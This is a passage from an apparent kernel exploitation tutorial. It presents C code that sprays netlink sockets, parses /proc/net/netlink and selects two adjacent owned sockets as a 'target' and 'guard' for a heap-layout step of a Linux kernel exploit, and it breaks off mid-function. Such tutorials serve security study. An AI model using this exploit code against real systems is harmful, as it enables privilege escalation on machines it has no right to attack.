<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">pid</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="cm">/*</span>
<span class="cm"> * Creates a NETLINK_USERSOCK netlink socket, binds it and retrieves its pid.</span>
<span class="cm"> * Argument @sp must not be NULL.</span>
<span class="cm"> *</span>
<span class="cm"> * Returns 0 on success, -1 on error.</span>
<span class="cm"> */</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">create_netlink_candidate</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock_pid</span><span class="w"> </span><span class="o">*</span><span class="n">sp</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">sockaddr_nl</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_pad</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="c1">// zero to use netlink_autobind()</span>
<span class="w">    </span><span class="p">.</span><span class="n">nl_groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="c1">// no groups</span>

<span class="w">  </span><span class="p">};</span><span class="w"></span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">addr_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_socket</span><span class="p">(</span><span class="n">AF_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_USERSOCK</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] socket"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_bind</span><span class="p">(</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] bind"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail_close</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_getsockname</span><span class="p">(</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr_len</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] getsockname"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail_close</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addr</span><span class="p">.</span><span class="n">nl_pid</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail_close</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="p">);</span><span class="w"></span>
<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Next, we need to parse the <em>/proc/net/netlink</em> file. In addition, the <em>parse_proc_net_netlink()</em> allocates a <em>pids</em> array that holds <strong>all</strong> netlink socket pids (including the one we do not own):</p><div class="highlight"><pre><span></span><code><span class="cm">/*</span>
<span class="cm"> * Parses @proto hash table from '/proc/net/netlink' and allocates/fills the</span>
<span class="cm"> * @pids array. The total numbers of pids matched is stored in @nb_pids.</span>
<span class="cm"> *</span>
<span class="cm"> * A typical output looks like:</span>
<span class="cm"> *</span>
<span class="cm"> *    $ cat /proc/net/netlink</span>
<span class="cm"> *    sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops</span>
<span class="cm"> *    ffff88001eb47800 0   0      00000000 0        0        (null) 2        0       </span>
<span class="cm"> *    ffff88001fa65800 6   0      00000000 0        0        (null) 2        0     </span>
<span class="cm"> *</span>
<span class="cm"> * Every line is printed from netlink_seq_show():</span>
<span class="cm"> *</span>
<span class="cm"> *    seq_printf(seq, "%p %-3d %-6d %08x %-8d %-8d %p %-8d %-8d\n"</span>
<span class="cm"> *</span>
<span class="cm"> * Returns 0 on success, -1 on error.</span>
<span class="cm"> */</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">parse_proc_net_netlink</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">**</span><span class="n">pids</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="o">*</span><span class="n">nb_pids</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">proto</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">proc_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">eol_token</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">nb_bytes_read</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">tot_pids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1024</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="o">*</span><span class="n">pids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="o">*</span><span class="n">nb_pids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="o">*</span><span class="n">pids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calloc</span><span class="p">(</span><span class="n">tot_pids</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">**</span><span class="n">pids</span><span class="p">)))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] not enough memory"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">proc_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_open</span><span class="p">(</span><span class="s">"/proc/net/netlink"</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] open"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="nl">read_next_block</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_read</span><span class="p">(</span><span class="n">proc_fd</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] read"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail_close</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="c1">// no more line to read</span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">parsing_complete</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="s">"sk"</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="c1">// this is the first line</span>
<span class="w">  </span><span class="p">{</span><span class="w"> </span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">eol_token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strstr</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="c1">// XXX: we don't handle this case, we can't even read one line...</span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] can't find end of first line</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">fail_close</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="n">nb_bytes_read</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">eol_token</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">eol_token</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="c1">// skip the first line</span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="nl">parse_next_line</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="c1">// this is a "normal" line</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">eol_token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strstr</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="c1">// current line is incomplete</span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_lseek</span><span class="p">(</span><span class="n">proc_fd</span><span class="p">,</span><span class="w"> </span><span class="n">nb_bytes_read</span><span class="p">,</span><span class="w"> </span><span class="n">SEEK_SET</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] lseek"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">fail_close</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">read_next_block</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="k">else</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">cur_addr</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">cur_proto</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">cur_pid</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">sscanf</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="s">"%p %d %d"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cur_addr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cur_proto</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cur_pid</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cur_proto</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">proto</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">nb_pids</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">tot_pids</span><span class="p">)</span><span class="w"> </span><span class="c1">// current array is not big enough, make it grow</span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">tot_pids</span><span class="w"> </span><span class="o">*=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="o">*</span><span class="n">pids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">realloc</span><span class="p">(</span><span class="o">*</span><span class="n">pids</span><span class="p">,</span><span class="w"> </span><span class="n">tot_pids</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] not enough memory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">fail_close</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>

<span class="w">      </span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">pids</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="o">*</span><span class="n">nb_pids</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cur_pid</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="o">*</span><span class="n">nb_pids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">nb_pids</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>

<span class="w">    </span><span class="n">nb_bytes_read</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">eol_token</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">eol_token</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">parse_next_line</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="nl">parsing_complete</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">proc_fd</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail_close</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">proc_fd</span><span class="p">);</span><span class="w"></span>
<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">pids</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="n">pids</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="o">*</span><span class="n">nb_pids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Finally, plug these guys together with <em>find_netlink_candidates()</em> which does:</p><ol><li>create a lot of netlink sockets (spray)</li><li>parse the <em>/proc/net/netlink</em> file</li><li>try to find two sockets that we own and are consecutive</li><li>release all other netlink sockets (cf. next section)</li></ol><div class="highlight"><pre><span></span><code><span class="cp">#define MAX_SOCK_PID_SPRAY 300</span>

<span class="cm">/*</span>
<span class="cm"> * Prepare multiple netlink sockets and search "adjacent" ones. Arguments</span>
<span class="cm"> * @target and @guard must not be NULL.</span>
<span class="cm"> *</span>
<span class="cm"> * Returns 0 on success, -1 on error.</span>
<span class="cm"> */</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">find_netlink_candidates</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock_pid</span><span class="w"> </span><span class="o">*</span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock_pid</span><span class="w"> </span><span class="o">*</span><span class="n">guard</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">sock_pid</span><span class="w"> </span><span class="n">candidates</span><span class="p">[</span><span class="n">MAX_SOCK_PID_SPRAY</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">pids</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">nb_pids</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">nb_owned</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">guard</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// allocate a bunch of netlink sockets</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MAX_SOCK_PID_SPRAY</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">create_netlink_candidate</span><span class="p">(</span><span class="o">&amp;</span><span class="n">candidates</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"> </span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to create a new candidate</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">goto</span><span class="w"> </span><span class="n">release_candidates</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] %d candidates created</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_SOCK_PID_SPRAY</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">parse_proc_net_netlink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pids</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nb_pids</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_USERSOCK</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] failed to parse '/proc/net/netlink'</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">release_pids</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] parsing '/proc/net/netlink' complete</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// find two consecutives pid that we own (slow algorithm O(N*M))</span>
<span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nb_pids</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">--</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">guard</span><span class="o">-&gt;</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pids</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pids</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="n">nb_owned</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="c1">// the list is not ordered by pid, so we do a full walking</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MAX_SOCK_PID_SPRAY</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">j</span><span class="p">)</span><span class="w"> </span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">candidates</span><span class="p">[</span><span class="n">j</span><span class="p">].</span><span class="n">pid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">guard</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">guard</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">candidates</span><span class="p">[</span><span class="n">j</span><span class="p">].</span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">nb_owned</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">candidates</span><span class="p">[</span><span class="n">j</span><span class="p">].</span><span class="n">pid</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">target</span><span class="o">-&gt;</span><span class="n">sock_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">candidates</span><span class="p">[</span><span class="n">j</span><span class="p">].</span><span class="n">sock_fd</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">nb_owned</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>

<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">nb_owned</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"></span>
